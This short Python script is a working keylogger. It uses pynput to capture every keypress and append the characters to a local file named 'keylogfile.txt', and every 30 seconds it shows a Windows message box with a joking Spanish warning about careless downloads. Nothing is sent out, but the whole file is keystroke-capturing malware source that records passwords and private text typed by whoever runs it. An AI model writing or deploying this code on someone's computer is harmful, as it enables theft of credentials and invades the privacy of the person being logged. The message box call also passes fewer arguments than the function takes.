from pynput import keyboard
import time
import threading
import ctypes

start_time = time.time()

def show_advertencia():
    ctypes.windll.user32.MessageBoxW(0, "Cuidao con lo q descargas de las interwebs:v")



def keyPressed(key):
    global start_time
    
    if time.time() - start_time >= 60 * 0.5:
        threading.Thread(target=show_advertencia).start()
        start_time = time.time()
    
    
    print(str(key))
    with open("keylogfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("No se pudo obtener char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
